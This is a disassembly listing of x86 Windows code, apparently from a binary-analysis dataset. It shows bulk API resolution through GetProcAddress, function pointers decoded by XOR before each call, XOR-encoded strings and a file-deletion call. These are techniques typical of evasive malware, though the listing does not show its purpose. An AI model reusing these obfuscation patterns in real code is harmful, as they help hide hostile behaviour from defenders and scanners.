jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x988 ]
push ecx
lea edx [ esi + 0x5070 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x5e0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x5e0 ]
push eax
lea ecx [ esi + 0x5178 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x3e0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x3e0 ]
push edx
lea eax [ esi + 0x5280 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x738 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x738 ]
push ecx
lea edx [ esi + 0x5388 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x4e0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x4e0 ]
push eax
lea ecx [ esi + 0x5490 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x2d4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x2d4 ]
push edx
lea eax [ esi + 0x5598 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x8e8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x8e8 ]
push ecx
lea edx [ esi + 0x56a0 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0xe8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ esi + 0x57a8 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0xaa0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xaa0 ]
push edx
lea eax [ esi + 0x58b0 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x910 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x910 ]
push ecx
lea edx [ esi + 0x59b8 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x58 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ esi + 0x5ac0 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x620 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x620 ]
push edx
lea eax [ esi + 0x5bc8 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x2f0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x2f0 ]
push ecx
lea edx [ esi + 0x5cd0 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x360 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x360 ]
push eax
lea ecx [ esi + 0x5dd8 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x1bc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x1bc ]
push edx
lea eax [ esi + 0x5ee0 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x5a0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x5a0 ]
push ecx
lea edx [ esi + 0x5fe8 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x660 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x660 ]
push eax
lea ecx [ esi + 0x60f0 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x808 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x808 ]
push edx
lea eax [ esi + 0x61f8 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x420 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x420 ]
push ecx
lea edx [ esi + 0x6300 ]
push edx
call sub_1007f5d0
lea eax [ ebp - 0x6f0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x6f0 ]
push eax
lea ecx [ esi + 0x6408 ]
push ecx
call sub_1007f5d0
lea eax [ ebp - 0x714 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x714 ]
push edx
lea eax [ esi + 0x6510 ]
push eax
call sub_1007f5d0
lea eax [ ebp - 0x130 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x130 ]
push ecx
add esi 0x6618
push esi
call sub_1007f5d0
mov eax [ rw-data ]
mov esi [ GetProcAddress@IAT ]
add esp 0xc
lea edx [ ebp - 0x780 ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xbe8 ]
mov [ ecx + 0x104 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2c ]
mov [ ecx + 0x20c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x6a8 ]
mov [ ecx + 0x314 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x280 ]
mov [ ecx + 0x41c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3a0 ]
mov [ ecx + 0x524 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xd0 ]
mov [ ecx + 0x62c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x440 ]
mov [ ecx + 0x734 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc9c ]
mov [ ecx + 0x83c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x480 ]
mov [ ecx + 0x944 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0xa4c ] eax
lea edx [ ebp - 0x5c0 ]
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xaf0 ]
mov [ ecx + 0xb54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb8 ]
mov [ ecx + 0xc5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x14c ]
mov [ ecx + 0xd64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4c0 ]
mov [ ecx + 0xe6c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x7e4 ]
mov [ ecx + 0xf74 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x75c ]
mov [ ecx + 0x107c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3c0 ]
mov [ ecx + 0x1184 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc14 ]
mov [ ecx + 0x128c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x684 ]
mov [ ecx + 0x1394 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x460 ]
mov [ ecx + 0x149c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x70 ]
mov [ ecx + 0x15a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x400 ]
mov [ ecx + 0x16ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x874 ]
mov [ ecx + 0x17b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x328 ]
mov [ ecx + 0x18bc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x40 ]
mov [ ecx + 0x19c4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xd0c ]
mov [ ecx + 0x1acc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x9d8 ]
mov [ ecx + 0x1bd4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1a0 ]
mov [ ecx + 0x1cdc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x6cc ]
mov [ ecx + 0x1de4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4a0 ]
mov [ ecx + 0x1eec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x210 ]
mov [ ecx + 0x1ff4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x29c ]
mov [ ecx + 0x20fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x540 ]
mov [ ecx + 0x2204 ] eax
push edx
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x100 ]
mov [ ecx + 0x230c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x18 ]
mov [ ecx + 0x2414 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa28 ]
mov [ ecx + 0x251c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x82c ]
mov [ ecx + 0x2624 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x580 ]
mov [ ecx + 0x272c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x7a4 ]
mov [ ecx + 0x2834 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x118 ]
mov [ ecx + 0x293c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x850 ]
mov [ ecx + 0x2a44 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x344 ]
mov [ ecx + 0x2b4c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x520 ]
mov [ ecx + 0x2c54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x600 ]
mov [ ecx + 0x2d5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x380 ]
mov [ ecx + 0x2e64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc40 ]
mov [ ecx + 0x2f6c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x640 ]
mov [ ecx + 0x3074 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xac8 ]
mov [ ecx + 0x317c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa0 ]
mov [ ecx + 0x3284 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x8c0 ]
mov [ ecx + 0x338c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x264 ]
mov [ ecx + 0x3494 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x88 ]
mov [ ecx + 0x359c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb40 ]
mov [ ecx + 0x36a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x248 ]
mov [ ecx + 0x37ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x560 ]
mov [ ecx + 0x38b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x960 ]
mov [ ecx + 0x39bc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x168 ]
mov [ ecx + 0x3ac4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc6c ]
mov [ ecx + 0x3bcc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1d8 ]
mov [ ecx + 0x3cd4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xbbc ]
mov [ ecx + 0x3ddc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xd4c ]
mov [ ecx + 0x3ee4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa00 ]
mov [ ecx + 0x3fec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1f4 ]
mov [ ecx + 0x40f4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x938 ]
mov [ ecx + 0x41fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x9b0 ]
mov [ ecx + 0x4304 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x500 ]
mov [ ecx + 0x440c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb18 ]
mov [ ecx + 0x4514 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x461c ] eax
mov eax [ rw-data ]
lea edx [ ebp - 0xb68 ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa50 ]
mov [ ecx + 0x4724 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x898 ]
mov [ ecx + 0x482c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x30c ]
mov [ ecx + 0x4934 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xcd0 ]
mov [ ecx + 0x4a3c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x22c ]
mov [ ecx + 0x4b44 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa78 ]
mov [ ecx + 0x4c4c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x184 ]
mov [ ecx + 0x4d54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2b8 ]
mov [ ecx + 0x4e5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb90 ]
mov [ ecx + 0x4f64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x988 ]
mov [ ecx + 0x506c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x5e0 ]
mov [ ecx + 0x5174 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3e0 ]
mov [ ecx + 0x527c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x738 ]
mov [ ecx + 0x5384 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4e0 ]
mov [ ecx + 0x548c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2d4 ]
mov [ ecx + 0x5594 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x8e8 ]
mov [ ecx + 0x569c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xe8 ]
mov [ ecx + 0x57a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xaa0 ]
mov [ ecx + 0x58ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x910 ]
mov [ ecx + 0x59b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x58 ]
mov [ ecx + 0x5abc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x620 ]
mov [ ecx + 0x5bc4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2f0 ]
mov [ ecx + 0x5ccc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x5dd4 ] eax
lea edx [ ebp - 0x360 ]
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1bc ]
mov [ ecx + 0x5edc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x5a0 ]
mov [ ecx + 0x5fe4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x660 ]
mov [ ecx + 0x60ec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x808 ]
mov [ ecx + 0x61f4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x420 ]
mov [ ecx + 0x62fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x6f0 ]
mov [ ecx + 0x6404 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x714 ]
mov [ ecx + 0x650c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x130 ]
mov [ ecx + 0x6614 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x671c ] eax
jmp r-xdata
sub_1000e7d0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
add eax eax
add eax eax
push eax
push ecx
call sub_1006ee90
add esp 0x8
mov [ esi ] eax
pop esi
pop ebp
retn
sub_1000e810
push esi
mov esi ecx
cmp [ esi + 0xb8 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc4 ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0xd8 ]
call eax
mov [ esi + 0xc0 ] 0x0
mov ecx [ esi + 0xd8 ]
push eax
call ecx
mov [ esi + 0xc4 ] 0x0
sub_1000e870
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
push esi
xor eax eax
mov bl 0x38
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea ecx [ ebp - 0x14 ]
push ecx
push edx
push eax
push eax
mov [ ebp - 0x14 ] 0xb
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
call [ ebp + 0xc ]
mov esi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x10 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1000e930
push ebp
mov ebp esp
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov ebx ecx
lea ecx [ ebp - 0x220 ]
xor edi edi
push ecx
lea edx [ ebp - 0x218 ]
push edx
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x228 ] edi
mov [ ebp - 0x218 ] edi
mov [ ebp - 0x220 ] edi
call sub_10037500
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x220 ]
mov esi [ ebp - 0x218 ]
lea eax [ ebp - 0x21c ]
push eax
push ecx
push esi
lea ecx [ ebp - 0x228 ]
mov edx ebx
call sub_10060900
test eax eax
je r-xdata
lea eax [ edi + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x218 ]
mov eax 0x46
call sub_10045930
push edx
mov eax edx
push eax
mov ecx edx
mov edx [ rw-data ]
push ecx
push 0x1
push 0x1
push edx
lea eax [ ebp - 0x214 ]
mov [ ebp - 0x224 ] 0x1
call sub_10066ff0
test eax eax
jne r-xdata
cmp esi edi
je r-xdata
mov ebx [ HeapFree@IAT ]
cmp esi edi
je r-xdata
mov eax [ ebp - 0x228 ]
mov ecx [ ebp - 0x21c ]
push eax
push ecx
lea eax [ ebp - 0x214 ]
call sub_10005c30
add esp 0x8
mov [ ebp - 0x224 ] eax
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x21c ]
cmp eax edi
je r-xdata
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp [ ebp - 0x224 ] edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
lea edx [ ebp - 0x214 ]
push edx
call sub_1004cc40
test eax eax
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x214 ]
push ecx
call [ DeleteFileW@IAT ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x214 ]
push eax
call [ DeleteFileW@IAT ]
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
sub_1000eaf0
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x69
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x5e
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x14 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x63
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0x9
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x3c ]
xor eax eax
push ecx
mov [ ebp - 0x2a ] ax
call esi
lea edx [ ebp - 0x28 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_1007f5d0
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_1007f5d0
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x28 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_1007f5d0
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_1007f5d0
add esp 0xc
push r--data
call esi
